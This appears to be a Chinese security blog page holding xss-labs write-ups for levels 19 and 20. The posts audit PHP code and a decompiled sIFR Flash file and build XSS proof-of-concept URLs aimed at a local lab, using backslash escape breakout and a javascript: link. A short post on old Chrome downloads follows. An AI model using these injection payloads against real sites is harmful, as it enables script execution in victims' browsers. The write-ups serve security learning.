<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf04.swf?&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>​	它使用了<code>htmlspecialchars</code>函数将引号字符默认转移了，所以当我们输入<code>?arg01=id&amp;arg02=test&quot;));&#125;catch(e)&#123;alert(1)&#125;//</code>时，实际后端拼接的内容是：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x <span class="keyword">try</span>&#123;   </span><br><span class="line">    <span class="title function_">__Flash__toXML</span>(<span class="title function_">load</span>(<span class="string">&quot;test\&quot;));</span></span><br><span class="line"><span class="string">&#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">    alert(1)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//&quot;</span>)) ; </span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;     </span><br><span class="line">    <span class="variable constant_">JS</span>行为</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	可以显而易见的看出__Flash__toXML函数调用的load函数中传入的参数并没有闭合，导致程序误以为后面的内容<code>));&#125; catch (e) &#123;alert(1)&#125;//</code> 都是函数传入的参数，所以我们需要突破这里的转义。</p>
<p>​	但是我们没有办法通过输入引号字符闭合，所以这里我们只能通过输入<code>\</code> 符号去闭合 PHP <code>htmlspecialchars</code> 函数生成的 <code>\</code>，所以此时的访问地址应该为</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/xss/level20.php?arg01=id&arg02=test%5C%5C%22));%7Dcatch(e)%7Balert(1)%7D//">http://localhost:8080/xss/level20.php?arg01=id&amp;arg02=test\\&quot;));}catch(e){alert(1)}//</a></p>
</blockquote>
<p><img src="/images/image-20240322135212147.png" alt="image-20240322135212147"></p>
<p>​	访问依旧没有任何反应</p>
<h3 id="2-4-补齐参数"><a href="#2-4-补齐参数" class="headerlink" title="2.4 补齐参数"></a>2.4 补齐参数</h3><p>​	在上面的分析过程中似乎需要传入三个参数(id，width，height)，但是后端PHP仅仅能接受(arg01，arg02)两个参数，如我们照常通过GET请求将起不到任何作用</p>
<p><img src="/images/image-20240322140007291.png" alt="image-20240322140007291"></p>
<p>​	这时我们应该想到资源请求这个点，html页面加载<code>.swf</code>文件时，会根据src提供的路径去发送GET请求，如果在请求URL中存在URL编码的数据，将会在解码后继续访问，所以我们只要让src中的内容为:</p>
<blockquote>
<p>src&#x3D;”xsf04.swf?id&#x3D;test\“));}catch(e){alert(1)}&#x2F;&#x2F;&amp;width&#x3D;123&amp;height&#x3D;123”</p>
<p>将 &amp; 进行 URL 编码(%26)，所以我们的实际访问地址为:</p>
<p>src&#x3D;”xsf04.swf?id&#x3D;test\“));}catch(e){alert(1)}&#x2F;&#x2F;%26width&#x3D;123%26height&#x3D;123”</p>
</blockquote>
<h2 id="3-POC构造"><a href="#3-POC构造" class="headerlink" title="3. POC构造"></a>3. POC构造</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/xss/level20.php?arg01=id&arg02=test%5C%5C%22));%7Dcatch(e)%7Balert(1)%7D//&width=123&height=123">http://localhost:8080/xss/level20.php?arg01=id&amp;arg02=test\\&quot;));}catch(e){alert(1)}//%26width=123%26height=123</a></p>
</blockquote>
<p><img src="/images/image-20240322140354439.png" alt="image-20240322140354439"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/22/web-XSS-FlashXss-xss-labs20/" data-id="clu6lf1ho000za2vd2fz44wwj" data-title="web-XSS-FlashXss-xss-labs20" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-web-XSS-FlashXss-xss-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/22/web-XSS-FlashXss-xss-labs/" class="article-date">
  <time class="dt-published" datetime="2024-03-22T03:03:16.000Z" itemprop="datePublished">2024-03-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/22/web-XSS-FlashXss-xss-labs/">web-XSS-FlashXss-xss-labs</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[toc]</p>
<h1 id="Flash-poc"><a href="#Flash-poc" class="headerlink" title="Flash-poc"></a>Flash-poc</h1><h2 id="0-靶场环境"><a href="#0-靶场环境" class="headerlink" title="0. 靶场环境"></a>0. 靶场环境</h2><pre><code>访问靶场: http://localhost:8080/xss/level19.php?arg01=a&amp;arg02=b
</code></pre>
<p><img src="/images/image-20240321202115815.png" alt="image-20240321202115815"></p>
<h2 id="1-后端代码审计"><a href="#1-后端代码审计" class="headerlink" title="1. 后端代码审计"></a>1. 后端代码审计</h2><p><img src="/images/image-20240322104404913.png" alt="image-20240322104404913"></p>
<p>​	可以发现URL通过GET请求传入的参数arg01和arg02分别被作为xsf03.swf调用的键和值，访问<code>http://127.0.0.1:8080/xss/level19.php?arg01=a&amp;arg02=b</code>验证，打开控制台，查看内容发现没有突破点</p>
<p><img src="/images/image-20240321202220244.png" alt="image-20240321202220244"></p>
<p>​	通过阅读报错信息，可以看到flash报错里面提示sifr.js是没有定义的，不过xsf03.swf在页面显示过程中仅仅以图片的形式展示，所以我们需要对该文件进行反编译查看源码</p>
<h2 id="2-flash-反编译"><a href="#2-flash-反编译" class="headerlink" title="2. flash 反编译"></a>2. flash 反编译</h2><p>​	使用 [jpexs-decompiler][<a target="_blank" rel="noopener" href="https://github.com/jindrapetrik/jpexs-decompiler]">https://github.com/jindrapetrik/jpexs-decompiler]</a> 工具反编译xsf03.swf</p>
<p><img src="/images/image-20240321203736853.png" alt="image-20240321203736853"></p>
<h3 id="2-1-VERSION-WARNING-变量追踪"><a href="#2-1-VERSION-WARNING-变量追踪" class="headerlink" title="2.1 VERSION_WARNING 变量追踪"></a>2.1 VERSION_WARNING 变量追踪</h3><p>​	在其中的代码段，我们搜索报错信息”Movie ..”，可以看见在<code>static var VERSION_WARNING</code> 变量中定义了这串内容</p>
<p><img src="/images/image-20240321204707602.png" alt="image-20240321204707602"></p>
<p>​	那么接下来肯定有数据拼接的地方，所以我们按照关键字搜索<code>VERSION_WARNING</code> ，可以发现以下逻辑，首先根据”%s”字符对<code>VERSION_WARNING</code> 进行了分割，然后根据_root.version的内容将分割后的数据拼接起来</p>
<p><img src="/images/image-20240321204840700.png" alt="image-20240321204840700"></p>
<p>​	要想执行到这儿，就必须满足:</p>
<ul>
<li>_loc5_ 变量的值为真</li>
<li>_root.version 从文件对象上获取到的 version 数值不等于默认数值</li>
</ul>
<p><img src="/images/image-20240322093218253.png" alt="image-20240322093218253"></p>
<h3 id="2-2-root-预定义全局对象"><a href="#2-2-root-预定义全局对象" class="headerlink" title="2.2 _root 预定义全局对象"></a>2.2 _root 预定义全局对象</h3><p>​	首先先要搞懂什么是_root</p>
<p>​	_root 是一个预定义的全局对象，代表舞台（Stage）的根级别。它提供对 Flash 动画中的顶级元素和属性的访问。</p>
<p>通过 _root 对象，可以访问舞台的属性、变量和方法，以及舞台上的其他对象。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在 Flash 中，<span class="emphasis">_root 对象通常包含以下一些预定义的变量：</span></span><br><span class="line"><span class="emphasis">+ _</span>root.<span class="emphasis">_width：舞台的宽度（以像素为单位）。</span></span><br><span class="line"><span class="emphasis">+ _</span>root.<span class="emphasis">_height：舞台的高度（以像素为单位）。</span></span><br><span class="line"><span class="emphasis">+ _</span>root.<span class="emphasis">_xmouse：鼠标在舞台上的 X 坐标位置（以舞台左上角为原点）。</span></span><br><span class="line"><span class="emphasis">+ _</span>root.<span class="emphasis">_ymouse：鼠标在舞台上的 Y 坐标位置（以舞台左上角为原点）。</span></span><br><span class="line"><span class="emphasis">+ _</span>root.<span class="emphasis">_framesloaded：已加载的帧数。</span></span><br><span class="line"><span class="emphasis">+ _</span>root.<span class="emphasis">_totalframes：场景中的总帧数。</span></span><br><span class="line"><span class="emphasis">+ _</span>root.<span class="emphasis">_url：当前 SWF 文件的 URL 地址。</span></span><br><span class="line"><span class="emphasis">+ _</span>root.<span class="emphasis">_parent：舞台的父级对象（通常为空，因为舞台是顶级对象）。</span></span><br><span class="line"><span class="emphasis">+ _</span>root.<span class="emphasis">_global：用于访问全局变量和函数。</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-loc4-利用条件限制绕过"><a href="#2-3-loc4-利用条件限制绕过" class="headerlink" title="2.3 _loc4_ 利用条件限制绕过"></a>2.3 _loc4_ 利用条件限制绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">function</span> <span class="title function_">checkDomain</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    	如果未绑定限制该flash使用域名贼直接返回true </span></span><br><span class="line"><span class="comment">    	因为我们是默认环境，所以直接忽略这个函数就行</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">if</span>(sIFR.<span class="property">domains</span>.<span class="property">length</span> == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _loc2_ = <span class="keyword">new</span> <span class="title class_">LocalConnection</span>().<span class="title function_">domain</span>();</span><br><span class="line">    <span class="keyword">var</span> _loc3_ = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(_loc3_ &lt; sIFR.<span class="property">domains</span>.<span class="property">length</span>)&#123;</span><br><span class="line">         <span class="keyword">var</span> _loc4_ = sIFR.<span class="property">domains</span>[_loc3_];</span><br><span class="line">         <span class="keyword">if</span>(_loc4_ == <span class="string">&quot;*&quot;</span> || _loc4_ == _loc2_)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">var</span> _loc5_ = _loc4_.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(_loc5_ &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">            _loc4_ = _loc4_.<span class="title function_">substr</span>(_loc5_ + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">var</span> _loc6_ = _loc2_.<span class="title function_">lastIndexOf</span>(_loc4_);</span><br><span class="line">            <span class="keyword">if</span>(_loc6_ &gt; -<span class="number">1</span> &amp;&amp; _loc6_ + _loc4_.<span class="property">length</span> == _loc2_.<span class="property">length</span>)&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">		_loc3_ = _loc3_ + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">function</span> <span class="title function_">checkLocation</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    	判断在请求swf的文件中是否有存在?</span></span><br><span class="line"><span class="comment">    	因为在一般情况下在URL请求行中出现?，那么在他后面跟着的、形式为&quot;x=x&quot;的、以&quot;&amp;&quot;拼接的就被当做是查询字符串</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">return</span> _root.<span class="property">_url</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;?&quot;</span>) == -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	那么就需要审计上面的那几个 if 条件判断了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var _loc4_ = sIFR.DEFAULT_TEXT;</span><br><span class="line">var _loc5_ = true;</span><br><span class="line"></span><br><span class="line">if(sIFR.checkLocation() &amp;&amp; sIFR.checkDomain())&#123;</span><br><span class="line">	_loc4_ = sIFR.unescapeUnicode(_root.content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(_loc4_ == &quot;undefined&quot; || _loc4_ == &quot;&quot;)&#123;</span><br><span class="line">	var _loc6_ = flash.external.ExternalInterface.call(&quot;sIFR.__resetBrokenMovies&quot;);</span><br><span class="line">    if(_loc6_)&#123;</span><br><span class="line">    	return undefined;</span><br><span class="line">    &#125;</span><br><span class="line">    _loc4_ = sIFR.DEFAULT_TEXT;</span><br><span class="line">    _loc5_ = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(_loc5_ &amp;&amp; _root.version != sIFR.VERSION)&#123;</span><br><span class="line">	_loc4_ = sIFR.VERSION_WARNING.split(&quot;%s&quot;).join(_root.version);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">	重新渲染对象，将对象的content属性赋值为 _loc4_</span><br><span class="line">	因为这里调用了new sIRF生成sIRF对象，那么机会重新执行</span><br><span class="line">	this.setupEvents();</span><br><span class="line">    this.write(content);</span><br><span class="line">    this.repaint();</span><br><span class="line">*/</span><br><span class="line">sIFR.instance = new sIFR(_loc3_.txtF,_loc4_);</span><br></pre></td></tr></table></figure>

<ol>
<li><p>要是在请求的swf文件中不存在查询字符串，那么 <code>sIFR.checkLocation()</code> 返回为false，_loc4将会获取到默认值sIFR.DEFAULT_TEXT，但是默认定义中：</p>
<p><img src="/images/image-20240322094956319.png" alt="image-20240322094956319"></p>
<p>其数值必然不满足<code>_root.version != sIFR.VERSION</code>，所以无法进入if语句块去格式化字符串</p>
</li>
<li><p>所以就需要传入查询字符串，<code>_root.content</code>会获取查询字符串的内容，<code>sIFR.unescapeUnicode</code>将会把字符串内容解码，只要传入了查询字符串，那么<code>_loc4_ == &quot;undefined&quot; || _loc4_ == &quot;&quot;</code>就不会成功，会直接进入第三个if判断</p>
</li>
<li><p>第三个就很简单，当你第二个if判断不进入if语句块，就能保证<code>_loc5_ </code>为true，那么接下来就该处理<code>_root.version != sIFR.VERSION</code>，因为我们需要渲染<code>_loc4_</code>使其获得<code>sIFR.VERSION_WARNING.split(&quot;%s&quot;).join(_root.version)</code>拼接结果从而导致xss漏洞，所以传入的参数不能为<code>?version=436</code></p>
</li>
</ol>
<h3 id="2-4-事件绑定与数据写入"><a href="#2-4-事件绑定与数据写入" class="headerlink" title="2.4 事件绑定与数据写入"></a>2.4 事件绑定与数据写入</h3><p>​	重新选然后将会执行<code>this.setupEvents();</code>绑定事件</p>
<p>​	然后再执行 <code>this.write(content);</code>重新写入内容</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setupEvents</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(_root.<span class="property">fixhover</span> == <span class="string">&quot;true&quot;</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">contentIsLink</span>())&#123;</span><br><span class="line">		<span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRollOver</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">			sIFR.<span class="title function_">call</span>(<span class="string">&quot;fireEvent&quot;</span>,<span class="string">&quot;onRollOver&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRollOut</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            sIFR.<span class="property">instance</span>.<span class="title function_">fixHover</span>();</span><br><span class="line">            sIFR.<span class="title function_">call</span>(<span class="string">&quot;fireEvent&quot;</span>,<span class="string">&quot;onRollOut&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRelease</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            sIFR.<span class="title function_">call</span>(<span class="string">&quot;fireEvent&quot;</span>,<span class="string">&quot;onRelease&quot;</span>);</span><br><span class="line">            <span class="title function_">getURL</span>(sIFR.<span class="property">instance</span>.<span class="property">primaryLink</span>,sIFR.<span class="property">instance</span>.<span class="property">primaryLinkTarget</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        sIFR.<span class="property">menu</span>.<span class="property">customItems</span> = sIFR.<span class="property">menuItems</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(_root.<span class="property">events</span> == <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRollOver</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">               sIFR.<span class="title function_">call</span>(<span class="string">&quot;fireEvent&quot;</span>,<span class="string">&quot;onRollOver&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRollOut</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">               sIFR.<span class="title function_">call</span>(<span class="string">&quot;fireEvent&quot;</span>,<span class="string">&quot;onRollOut&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRelease</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">               sIFR.<span class="title function_">call</span>(<span class="string">&quot;fireEvent&quot;</span>,<span class="string">&quot;onRelease&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(_root.<span class="property">cursor</span> == <span class="string">&quot;pointer&quot;</span>)&#123;</span><br><span class="line">               <span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRelease</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">               &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">            	<span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRelease</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRollOver</span>;</span><br><span class="line">			<span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">_parent</span>.<span class="property">onRollOut</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		sIFR.<span class="property">menu</span>.<span class="property">customItems</span> = [];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">content</span>)&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    	this.textField.htmlText 控制的是文字组件在html中输出展示的内容</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">textField</span>.<span class="property">htmlText</span> = [<span class="string">&quot;&lt;p class=\&quot;&quot;</span>,sIFR.<span class="property">CSS_ROOT_CLASS</span>,<span class="string">&quot;\&quot;&gt;&quot;</span>,content,<span class="string">&quot;&lt;/p&gt;&quot;</span>].<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	重点观察<code>this.textField._parent.onRelease</code>:</p>
<blockquote>
<p>​	<code>this.textField._parent.onRelease</code> 是一个事件处理代码，用于处理 Flash 中的按钮或可交互对象的释放（release）事件。</p>
<p>具体作用如下：</p>
<ul>
<li><code>this.textField</code> 是一个文本字段对象。</li>
<li><code>_parent</code> 是该文本字段对象的父级对象，也就是包含它的容器对象。</li>
<li><code>onRelease</code> 是一个事件处理函数，它会在用户释放（点击并释放）与该按钮或可交互对象关联的区域时触发。</li>
</ul>
<p>​	通过将代码 <code>this.textField._parent.onRelease</code> 与按钮或可交互对象关联，当用户释放该对象时，相关的操作或代码块将被执行。在这个特定的代码中，<code>this.textField._parent.onRelease</code> 被用作按钮或可交互对象的释放事件处理程序，可能会触发一些交互行为或执行其他相关的功能。</p>
</blockquote>
<p>​	具体的页面生命周期可能会因不同的实现方式和技术而有所不同，但通常情况下，包含SWF文件的网页在加载时会创建一个SWF对象并将其嵌入到网页的指定位置。SWF对象会被浏览器解析、渲染和执行，呈现给用户。用户与SWF对象进行交互时，事件处理代码会被触发执行相应的逻辑。</p>
<p>​	当用户离开该页面或浏览器关闭页面时，浏览器会销毁SWF对象，释放相关的内存和资源。这确保了页面加载和交互的正常进行，并避免了内存泄漏和资源浪费的问题。</p>
<p>​	所以要想在浏览过程中正确的触发加载swf文件，需要让<code>this.textField._parent.onRelease = function()&#123;sIFR.call(&quot;fireEvent&quot;,&quot;onRelease&quot;);&#125;;</code>这段内容生效，所以我们需使得<code>_root.fixhover == &quot;true&quot; &amp;&amp; this.contentIsLink())</code>成真</p>
<ol>
<li><p><code>_root.fixhover</code> 估计是页面的某个cursor操作，正常情况下是true的</p>
</li>
<li><p>那么就需要观察<code>this.contentIsLink())</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">contentIsLink</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    	其实判断内容是否是链接就是判断是不是用&lt;a&gt;标签传输的</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">content</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;a &quot;</span>) == <span class="number">0</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">content</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;a &quot;</span>) == <span class="variable language_">this</span>.<span class="property">content</span>.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;&lt;a &quot;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">content</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;/a&gt;&quot;</span>) == <span class="variable language_">this</span>.<span class="property">content</span>.<span class="property">length</span> - <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>​	至此分析结束，</p>
<h2 id="3-POC构造"><a href="#3-POC构造" class="headerlink" title="3. POC构造"></a>3. POC构造</h2><blockquote>
<p>?version&#x3D;&lt;a href&#x3D;”javascript:alert(1)”&gt;123</a></p>
</blockquote>
<p><img src="/images/image-20240322105506147.png" alt="image-20240322105506147"></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充:"></a>补充:</h2><h3 id="关于-getURL-sIFR-instance-primaryLink-sIFR-instance-primaryLinkTarget"><a href="#关于-getURL-sIFR-instance-primaryLink-sIFR-instance-primaryLinkTarget" class="headerlink" title="关于 getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget)"></a>关于 getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget)</h3><p>​	<code>getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget);</code>	</p>
<blockquote>
<p>​	<code>getURL(sIFR.instance.primaryLink, sIFR.instance.primaryLinkTarget)</code>是一个已被废弃的 ActionScript 2 函数，用于在 Flash 应用程序中执行页面导航操作。</p>
<p>具体作用如下：</p>
<ul>
<li><code>sIFR.instance.primaryLink</code> 是一个字符串，表示要导航到的目标 URL。</li>
<li><code>sIFR.instance.primaryLinkTarget</code> 是一个字符串，指定了链接应如何在浏览器中打开，例如 <code>_self</code> 表示在当前窗口打开，<code>_blank</code> 表示在新窗口打开。</li>
</ul>
<p><code>getURL()</code> 函数将根据提供的 URL 和目标参数执行相应的页面导航操作。在这个特定的代码中，它被用于根据 <code>sIFR.instance.primaryLink</code> 和 <code>sIFR.instance.primaryLinkTarget</code> 的值执行一个页面跳转操作，可能会打开一个新的浏览器窗口或在当前窗口中加载新的 URL。</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/22/web-XSS-FlashXss-xss-labs/" data-id="clu6lf1hn000wa2vd1y3s2wvn" data-title="web-XSS-FlashXss-xss-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tools-Chrome-OldVersion" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/22/tools-Chrome-OldVersion/" class="article-date">
  <time class="dt-published" datetime="2024-03-22T03:00:31.000Z" itemprop="datePublished">2024-03-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/22/tools-Chrome-OldVersion/">tools-Chrome-OldVersion</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Chrome历史版本获取"><a href="#Chrome历史版本获取" class="headerlink" title="Chrome历史版本获取"></a>Chrome历史版本获取</h1><p>​	在平时测试过程中需要使用到不同版本的Chrome浏览器版本</p>
<p>​	我们可以通过访问下面站点获取不同版本的Chrome</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.slimjet.com/chrome/google-chrome-old-version.php">https://www.slimjet.com/chrome/google-chrome-old-version.php</a></p>
</blockquote>
